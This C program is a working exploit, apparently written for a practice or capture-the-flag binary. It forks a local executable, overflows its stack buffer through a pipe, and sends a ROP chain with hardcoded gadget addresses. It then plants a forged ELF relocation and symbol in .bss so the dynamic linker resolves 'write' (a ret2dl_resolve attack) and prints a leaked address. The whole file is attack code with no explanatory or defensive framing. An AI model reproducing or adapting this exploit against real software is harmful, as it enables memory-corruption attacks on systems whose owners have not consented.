#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <elf.h>
#include <stdio.h>

const unsigned long BSS = 0x00404030;
const unsigned long JMPREL = 0x00400420;
const unsigned long SYMTAB = 0x00400328;
const unsigned long STRTAB = 0x00400388;
const unsigned long RET_DL_RESOLVE = 0x000401020;

#define WRITE_PIPE writePipe[1]
#define READ_PIPE readPipe[0]

static unsigned long aligin (unsigned long addr) {
    return (0x18 - (addr) % 0x18);
}

int main(void)
{
    pid_t child;
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    char *const argv[] = {"/home/loona/Documents/a.out", NULL};
    int readPipe[2];
    int writePipe[2];
    char buff[144];

    pipe(readPipe);
    pipe(writePipe);

    if (!(child = fork())) {
        dup2(writePipe[0], STDIN_FILENO);
        dup2(readPipe[1], STDOUT_FILENO);
        close(writePipe[1]);
        close(readPipe[0]);
        execv(argv[0], argv);
    }

    memset(buff, 'A', 32);

    unsigned long beginBss = BSS;
    beginBss += aligin(beginBss - JMPREL);
    int reloc_arg = (beginBss - JMPREL) / 0x18;

    unsigned long fake_symtab = beginBss + 0x18;
    fake_symtab += aligin(fake_symtab - SYMTAB) ;
    Elf64_Xword r_info = (((fake_symtab - SYMTAB) / 0x18) << 32) | 0x7 ;

    unsigned long fake_symstr = fake_symtab + 0x18;
    int st_name = fake_symstr - STRTAB;

    Elf64_Rela fakeRela = {0x00404018, r_info};
    Elf64_Sym fakeSym = {st_name, 0x12};


    unsigned long *rop = (unsigned long *) (buff + 32);
    *rop ++= 0;
    *rop ++= 0x004011a9; //pop rsi ; pop r15 ; ret  ;
    *rop ++= beginBss;
    *rop ++= 0;
    *rop ++= 0x00401030; //read;
    *rop ++= 0x004011a9; //0x004011a9 pop rsi ; pop r15 ; ret  ;  (1 found)
    *rop ++= 0x00404018;
    *rop ++= 0;
    *rop ++= 0x004011ab; //0x004011ab pop rdi ; ret  ;
    *rop ++= 1;
    *rop ++= RET_DL_RESOLVE;
    *rop ++= reloc_arg;

    write(WRITE_PIPE, buff, 0x90);

    memcpy(buff, &fakeRela, sizeof(fakeRela));
    memset(buff + sizeof(fakeRela), 'A', 8*2);
    memcpy(buff + (sizeof(fakeRela) + 8*2), &fakeSym, sizeof(fakeSym));

    int offset = 0x18 + 0x18 + 8 * 2;
    strncpy(buff + offset, "write\x00\x00", 8);
    write(WRITE_PIPE, buff, 0x90);

    unsigned long adress = 0;
    read(READ_PIPE, &adress, 8);
    printf("%lx", adress);
}
